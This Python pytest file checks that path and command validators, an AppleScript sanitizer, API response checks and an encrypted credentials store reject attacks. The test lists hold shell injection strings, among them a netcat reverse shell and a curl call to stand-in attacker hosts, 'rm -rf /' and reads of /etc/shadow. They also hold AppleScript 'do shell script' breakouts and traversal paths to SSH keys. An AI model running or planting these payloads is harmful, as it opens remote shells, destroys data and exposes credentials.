"""
Security hardening tests — penetration testing payloads for all three
CRITICAL issue fixes.

Covers:
- 50+ shell injection payloads → validate_file_path / validate_command_list
- 20+ AppleScript injection payloads → sanitize_applescript_string
- 30+ path traversal patterns → validate_file_path
- Null byte injection
- Symlink race condition prevention
- API response tampering / forgery → api_validators
- Credential tamper detection → CredentialsManager
"""

import json
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from tools.api_validators import APIResponseError, validate_restore_response
from tools.credentials_manager import CredentialsManager
from tools.input_validators import (
    InputValidationError,
    sanitize_applescript_string,
    validate_command_list,
    validate_file_path,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def make_cm(tmpdir: Path) -> CredentialsManager:
    enc = tmpdir / "encrypted"
    enc.mkdir(exist_ok=True)
    cm = CredentialsManager(encrypted_dir=enc)
    cm._cached_password = "security-test-password"  # pragma: allowlist secret
    cm._cache_ts = float("inf")
    return cm


def make_response(status_code: int, json_body):
    mock = MagicMock()
    mock.status_code = status_code
    mock.json.return_value = json_body
    mock.text = str(json_body)
    return mock


def assert_rejected(path: str, reason: str = ""):
    """Assert that validate_file_path raises InputValidationError."""
    with pytest.raises(InputValidationError, match=reason) if reason else pytest.raises(
        InputValidationError
    ):
        validate_file_path(path)


# ---------------------------------------------------------------------------
# Issue #3: Shell injection payloads → validate_file_path
# ---------------------------------------------------------------------------


class TestShellInjectionPayloads:
    """50+ shell injection patterns must all be rejected by validate_file_path."""

    SEMICOLON_PAYLOADS = [
        "/tmp/file.txt; cat /etc/passwd",
        "/tmp/file.txt; rm -rf /",
        "/tmp/file.txt; id",
        "/tmp/file.txt; whoami",
        "/tmp/file.txt; uname -a",
        "/tmp/file.txt; curl http://evil.com",
        "/tmp/file.txt; nc -e /bin/sh attacker.com 4444",
        "/tmp/file.txt; python3 -c 'import os; os.system(\"id\")'",
    ]

    PIPE_PAYLOADS = [
        "/tmp/file.txt | cat /etc/passwd",
        "/tmp/file.txt | tee /tmp/pwned",
        "/tmp/file.txt | sh",
        "/tmp/file.txt | bash -i",
        "/tmp/file.txt | nc attacker.com 4444",
    ]

    AMPERSAND_PAYLOADS = [
        "/tmp/file.txt && rm -rf /",
        "/tmp/file.txt && id",
        "/tmp/file.txt && cat /etc/shadow",
        "/tmp/file.txt & whoami &",
    ]

    SUBSTITUTION_PAYLOADS = [
        "/tmp/file.txt$(id)",
        "/tmp/file.txt`whoami`",
        "/tmp/file.txt$(cat /etc/passwd)",
        "/tmp/file.txt`cat /etc/passwd`",
        "/tmp/file$(id).txt",
        "`id`/file.txt",
        "$(whoami)/file.txt",
    ]

    VARIABLE_PAYLOADS = [
        "/tmp/$HOME/file.txt",
        "/tmp/${PATH}/file.txt",
        "/tmp/$USER/passwd",
        "/tmp/${IFS}file",
    ]

    REDIRECT_PAYLOADS = [
        "/tmp/file.txt > /etc/crontab",
        "/tmp/file.txt < /etc/passwd",
        "/tmp/file.txt >> /etc/hosts",
    ]

    @pytest.mark.parametrize("payload", SEMICOLON_PAYLOADS)
    def test_semicolon_injection_rejected(self, payload):
        with pytest.raises(InputValidationError):
            validate_file_path(payload)

    @pytest.mark.parametrize("payload", PIPE_PAYLOADS)
    def test_pipe_injection_rejected(self, payload):
        with pytest.raises(InputValidationError):
            validate_file_path(payload)

    @pytest.mark.parametrize("payload", AMPERSAND_PAYLOADS)
    def test_ampersand_injection_rejected(self, payload):
        with pytest.raises(InputValidationError):
            validate_file_path(payload)

    @pytest.mark.parametrize("payload", SUBSTITUTION_PAYLOADS)
    def test_command_substitution_rejected(self, payload):
        with pytest.raises(InputValidationError):
            validate_file_path(payload)

    @pytest.mark.parametrize("payload", VARIABLE_PAYLOADS)
    def test_variable_expansion_rejected(self, payload):
        with pytest.raises(InputValidationError):
            validate_file_path(payload)

    @pytest.mark.parametrize("payload", REDIRECT_PAYLOADS)
    def test_redirect_operator_rejected(self, payload):
        with pytest.raises(InputValidationError):
            validate_file_path(payload)


# ---------------------------------------------------------------------------
# Issue #3: AppleScript injection payloads → sanitize_applescript_string
# ---------------------------------------------------------------------------


class TestAppleScriptInjectionPayloads:
    """AppleScript injection: sanitized output must not break out of quoted context."""

    INJECTION_PAYLOADS = [
        # Quote-breaking
        'test"; do shell script "rm -rf /"',
        "test'; do shell script 'cat /etc/passwd'",
        'test" & (do shell script "id") & "',
        # Comment injection
        'test" -- tell app "Finder" to delete everything',
        'test" (* comment to confuse parser *) "',
        # Handler abuse
        'test" & (choose folder) & "',
        'test" & (path to home folder) & "',
        # Newline injection
        'test\ntell application "Finder" to empty trash',
        'test\rtell app "Terminal" to do script "rm -rf /"',
        # Unicode quote tricks
        "\u201ctest\u201d; do shell script \u201cid\u201d",
        # Nested quotes
        'test""; do shell script "id"; "test',
        # Control characters
        "test\x00injected",
        "test\x1b[31m",
    ]

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_payload_does_not_contain_unescaped_double_quote(self, payload):
        """After sanitization, no bare (unescaped) double-quotes should remain."""
        safe = sanitize_applescript_string(payload)
        # Count unescaped quotes: split on \" pairs and check remainder
        # Replace all escaped quotes, what remains should have no bare quotes
        stripped = safe.replace('\\"', "ESCAPED_QUOTE")
        assert '"' not in stripped, (
            f"Unescaped quote in sanitized output.\n" f"Input:  {payload!r}\n" f"Output: {safe!r}"
        )

    def test_do_shell_script_neutralized(self):
        payload = '"; do shell script "id"; "'
        safe = sanitize_applescript_string(payload)
        stripped = safe.replace('\\"', "")
        assert '"' not in stripped

    def test_tell_application_neutralized(self):
        payload = '"; tell application "Terminal" to quit; "'
        safe = sanitize_applescript_string(payload)
        stripped = safe.replace('\\"', "")
        assert '"' not in stripped

    def test_empty_string_safe(self):
        assert sanitize_applescript_string("") == ""

    def test_normal_path_preserved(self):
        path = "/Users/user/Documents/file.pdf"
        safe = sanitize_applescript_string(path)
        assert "/Users/user/Documents/file.pdf" in safe

    def test_backslash_doubled(self):
        result = sanitize_applescript_string("C:\\Users\\file")
        assert "\\\\" in result


# ---------------------------------------------------------------------------
# Issue #3: Path traversal → validate_file_path
# ---------------------------------------------------------------------------


class TestPathTraversalPayloads:
    """30+ path traversal patterns must all be rejected."""

    TRAVERSAL_PAYLOADS = [
        # Classic dot-dot (relative — rejected by existence check on all platforms)
        "../../../etc/shadow",
        "../../.ssh/id_rsa",
        # Absolute restricted paths (macOS-specific — rejected by restricted dir check)
        "/root/.ssh/id_rsa",
        "/root/.bash_history",
        "/proc/self/environ",
        # Mixed slash traversal (rejected by existence check)
        "....//....//....//etc/passwd",
        "....\\....\\....\\etc\\passwd",
        "/var/www/html/./../../config.php",
        # macOS restricted directories
        "/System/Library/Frameworks/Security.framework",
        "/System/Library/CoreServices/SystemVersion.plist",
        "/Library/LaunchDaemons/com.apple.mdmclient.plist",
        "/Library/Preferences/SystemConfiguration/preferences.plist",
        "/Applications/Safari.app/Contents/MacOS/Safari",
        "/Volumes/Macintosh HD/etc/passwd",
        # Hidden system files
        "/.DS_Store",
        "/.bash_history",
        "/.ssh/authorized_keys",
        # Null byte injection (path after null is ignored on some systems)
        "/tmp/file\x00/etc/passwd",
        # Whitespace-only
        "   ",
        "\t",
        "\n",
        # Non-string
    ]

    @pytest.mark.parametrize("payload", TRAVERSAL_PAYLOADS)
    def test_traversal_payload_rejected(self, payload):
        with pytest.raises(InputValidationError):
            validate_file_path(payload)

    def test_nonexistent_normal_path_rejected(self, tmp_path):
        """Non-existent benign path should also be rejected (existence check)."""
        with pytest.raises(InputValidationError, match="does not exist"):
            validate_file_path(str(tmp_path / "does_not_exist.txt"))


# ---------------------------------------------------------------------------
# Null byte injection
# ---------------------------------------------------------------------------


class TestNullByteInjection:
    def test_null_in_path_rejected(self):
        with pytest.raises(InputValidationError):
            validate_file_path("/tmp/file\x00/etc/passwd")

    def test_null_at_start_rejected(self):
        with pytest.raises(InputValidationError):
            validate_file_path("\x00/etc/passwd")


# ---------------------------------------------------------------------------
# Symlink race condition prevention
# ---------------------------------------------------------------------------


class TestSymlinkPrevention:
    def test_symlink_to_file_rejected(self, tmp_path):
        real = tmp_path / "real.txt"
        real.write_text("secret")
        link = tmp_path / "link.txt"
        link.symlink_to(real)

        with pytest.raises(InputValidationError, match="symlink"):
            validate_file_path(str(link))

    def test_symlink_to_restricted_dir_rejected(self, tmp_path):
        link = tmp_path / "sys_link"
        link.symlink_to("/System")

        with pytest.raises(InputValidationError):
            validate_file_path(str(link))

    def test_symlink_to_etc_rejected(self, tmp_path):
        link = tmp_path / "etc_link"
        try:
            link.symlink_to("/etc")
        except OSError:
            pytest.skip("Cannot create symlink in this environment")

        with pytest.raises(InputValidationError):
            validate_file_path(str(link))

    def test_chain_of_symlinks_rejected(self, tmp_path):
        """A symlink pointing to another symlink must be rejected."""
        real = tmp_path / "real.txt"
        real.write_text("content")
        link1 = tmp_path / "link1.txt"
        link1.symlink_to(real)
        link2 = tmp_path / "link2.txt"
        link2.symlink_to(link1)

        with pytest.raises(InputValidationError, match="symlink"):
            validate_file_path(str(link2))


# ---------------------------------------------------------------------------
# Issue #2: API response tampering → api_validators
# ---------------------------------------------------------------------------


class TestAPIResponseTampering:
    """Forged / tampered API responses must be rejected."""

    def test_forged_200_with_error_field_rejected(self):
        resp = make_response(200, {"error": {"code": "forged", "message": "fake success"}})
        with pytest.raises(APIResponseError, match="forged"):
            validate_restore_response(resp, expected_file_id="file_abc")

    def test_wrong_file_id_in_response_rejected(self):
        """Attacker swaps file ID in response — must detect mismatch."""
        resp = make_response(200, {"id": "attacker_controlled_id"})
        with pytest.raises(APIResponseError, match="mismatch"):
            validate_restore_response(resp, expected_file_id="legitimate_file_id")

    def test_empty_response_body_rejected(self):
        resp = make_response(200, {})
        with pytest.raises(APIResponseError, match="missing 'id'"):
            validate_restore_response(resp, expected_file_id="file_abc")

    def test_none_id_field_rejected(self):
        resp = make_response(200, {"id": None})
        with pytest.raises(APIResponseError):
            validate_restore_response(resp, expected_file_id="file_abc")

    def test_integer_id_field_mismatch(self):
        """API returns integer ID when string expected — must reject."""
        resp = make_response(200, {"id": 12345})
        with pytest.raises(APIResponseError, match="mismatch"):
            validate_restore_response(resp, expected_file_id="file_abc")

    def test_http_200_with_error_string_rejected(self):
        resp = make_response(200, {"error": "access denied"})
        with pytest.raises(APIResponseError):
            validate_restore_response(resp, expected_file_id="file_abc")

    def test_server_error_500_rejected(self):
        resp = make_response(500, {"message": "Internal Server Error"})
        with pytest.raises(APIResponseError) as exc_info:
            validate_restore_response(resp, expected_file_id="file_abc")
        assert exc_info.value.status_code == 500

    def test_unauthorized_401_rejected(self):
        resp = make_response(401, {"error": "Unauthorized"})
        with pytest.raises(APIResponseError) as exc_info:
            validate_restore_response(resp, expected_file_id="file_abc")
        assert exc_info.value.status_code == 401

    def test_deleted_file_metadata_rejected(self):
        from tools.api_validators import validate_metadata_response

        resp = make_response(200, {"id": "file_abc", "deleted": True})
        with pytest.raises(APIResponseError, match="deleted"):
            validate_metadata_response(resp, expected_file_id="file_abc")

    def test_batch_missing_responses_array_rejected(self):
        from tools.api_validators import validate_batch_response

        resp = make_response(200, {"not_responses": []})
        with pytest.raises(APIResponseError, match="missing 'responses'"):
            validate_batch_response(resp, expected_request_count=1)

    def test_batch_count_mismatch_rejected(self):
        from tools.api_validators import validate_batch_response

        resp = make_response(200, {"responses": [{"id": "0", "status": 200}]})
        with pytest.raises(APIResponseError, match="count mismatch"):
            validate_batch_response(resp, expected_request_count=5)


# ---------------------------------------------------------------------------
# Issue #1: Credential tamper detection → CredentialsManager
# ---------------------------------------------------------------------------


class TestCredentialTamperDetection:
    def test_tampered_ciphertext_rejected(self, tmp_path):
        """Flip bytes in ciphertext — AES-GCM auth tag must catch it."""
        cm = make_cm(tmp_path)
        cm.save("svc", "key", "original-value")

        enc_path = tmp_path / "encrypted" / "svc.enc"
        raw = bytearray(enc_path.read_bytes())
        # Flip bits in the middle of ciphertext
        if len(raw) > 16:
            raw[len(raw) // 2] ^= 0xFF
        enc_path.write_bytes(bytes(raw))

        # New manager with same password should fail to decrypt
        cm2 = make_cm(tmp_path)
        with pytest.raises(RuntimeError, match="Failed to decrypt"):
            cm2.load("svc", "key")

    def test_tampered_meta_salt_rejected(self, tmp_path):
        """Corrupt the salt in meta — key derivation produces wrong key."""
        cm = make_cm(tmp_path)
        cm.save("svc", "key", "original-value")

        meta_path = tmp_path / "encrypted" / "svc.meta"
        meta = json.loads(meta_path.read_text())
        # Corrupt salt by flipping first byte
        salt_bytes = bytearray(bytes.fromhex(meta["salt"]))
        salt_bytes[0] ^= 0xFF
        meta["salt"] = bytes(salt_bytes).hex()
        meta_path.write_text(json.dumps(meta))

        cm2 = make_cm(tmp_path)
        with pytest.raises(RuntimeError, match="Failed to decrypt"):
            cm2.load("svc", "key")

    def test_tampered_meta_iv_rejected(self, tmp_path):
        """Corrupt the IV in meta — decryption must fail."""
        cm = make_cm(tmp_path)
        cm.save("svc", "key", "original-value")

        meta_path = tmp_path / "encrypted" / "svc.meta"
        meta = json.loads(meta_path.read_text())
        iv_bytes = bytearray(bytes.fromhex(meta["iv"]))
        iv_bytes[0] ^= 0xFF
        meta["iv"] = bytes(iv_bytes).hex()
        meta_path.write_text(json.dumps(meta))

        cm2 = make_cm(tmp_path)
        with pytest.raises(RuntimeError, match="Failed to decrypt"):
            cm2.load("svc", "key")

    def test_plaintext_not_in_enc_file(self, tmp_path):
        """Credentials should never appear as plaintext on disk."""
        cm = make_cm(tmp_path)
        sensitive_value = "my-very-secret-api-key-12345"
        cm.save("svc", "key", sensitive_value)

        enc_path = tmp_path / "encrypted" / "svc.enc"
        raw = enc_path.read_bytes()
        assert sensitive_value.encode() not in raw, "Plaintext found in ciphertext file!"

    def test_cross_service_isolation(self, tmp_path):
        """Service A's key should not decrypt service B's ciphertext."""
        cm = make_cm(tmp_path)
        cm.save("service_a", "key", "value_a")
        cm.save("service_b", "key", "value_b")

        # Each service has its own salt/IV — the values should be independent
        assert cm.load("service_a", "key") == "value_a"
        assert cm.load("service_b", "key") == "value_b"

    def test_missing_service_file_raises_not_found(self, tmp_path):
        """Accessing nonexistent service raises FileNotFoundError, not a silent failure."""
        cm = make_cm(tmp_path)
        with pytest.raises(FileNotFoundError):
            cm.load("nonexistent", "key")

    def test_missing_key_raises_key_error(self, tmp_path):
        """Accessing nonexistent key raises KeyError, not a silent failure."""
        cm = make_cm(tmp_path)
        cm.save("svc", "existing", "value")
        with pytest.raises(KeyError):
            cm.load("svc", "nonexistent_key")


# ---------------------------------------------------------------------------
# validate_command_list
# ---------------------------------------------------------------------------


class TestValidateCommandList:
    def test_valid_command_list_passes(self):
        result = validate_command_list(["/bin/ls", "-la", "/tmp"])
        assert result == ["/bin/ls", "-la", "/tmp"]

    def test_string_command_rejected(self):
        """Passing a string instead of list should be rejected (shell=True risk)."""
        with pytest.raises(InputValidationError):
            validate_command_list("/bin/ls -la /tmp")  # type: ignore[arg-type]

    def test_non_string_element_rejected(self):
        with pytest.raises(InputValidationError):
            validate_command_list(["/bin/ls", 42])  # type: ignore[arg-type]

    def test_semicolon_in_element_rejected(self):
        with pytest.raises(InputValidationError):
            validate_command_list(["/bin/ls", "/tmp; id"])

    def test_pipe_in_element_rejected(self):
        with pytest.raises(InputValidationError):
            validate_command_list(["/bin/cat", "/etc/passwd | tee /tmp/out"])

    def test_backtick_in_element_rejected(self):
        with pytest.raises(InputValidationError):
            validate_command_list(["/bin/echo", "`whoami`"])

    def test_dollar_in_element_rejected(self):
        with pytest.raises(InputValidationError):
            validate_command_list(["/bin/echo", "$HOME"])

    def test_empty_list_passes(self):
        result = validate_command_list([])
        assert result == []

    def test_single_element_list_passes(self):
        result = validate_command_list(["/usr/bin/python3"])
        assert result == ["/usr/bin/python3"]
